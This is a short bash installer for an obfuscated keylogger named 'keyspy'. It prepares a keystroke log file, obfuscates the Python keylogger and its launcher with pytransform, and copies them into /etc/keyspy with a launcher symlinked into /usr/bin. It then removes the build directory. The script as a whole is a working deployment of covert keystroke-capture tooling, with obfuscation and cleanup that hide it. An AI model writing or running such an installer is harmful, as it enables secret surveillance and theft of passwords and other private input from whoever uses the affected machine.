#!/bin/bash
#install deps
sudo bash install-deps-zero.sh
sudo pacman -S wipe
#create directory's
sudo mkdir -p /etc/keyspy/
#create empty keylogg log file
sudo wipe /tmp/keylogg.tmp
sudo touch /tmp/keylogg.tmp
#build the obfuscation
bash build-obfuscate.sh
#add header to indicate python3 interpreter for execution
python3 add_header -anl header_py3.txt build/keylogg/dist/keylogg_button.py
python3 add_header -anl header_py3.txt build/launcher/dist/run-keyspy.py
#install the keylogger
sudo cp build/keylogg/dist/keylogg_button.py /etc/keyspy/keylogg_button.py
sudo chmod a+x /etc/keyspy/keylogg_button.py
#install the launcher of the keylogger program
sudo cp build/launcher/dist/run-keyspy.py /etc/keyspy/run-keyspy.py
sudo ln -s /etc/keyspy/run-keyspy.py /usr/bin/run-keyspy
sudo chmod a+x /usr/bin/run-keyspy
#install the pytransform deps
sudo cp -r build/launcher/dist/pytransform /etc/keyspy/pytransform
#make the current user the owner of this
sudo chown -R $USER:$USER /etc/keyspy/
sudo rm -rf build/

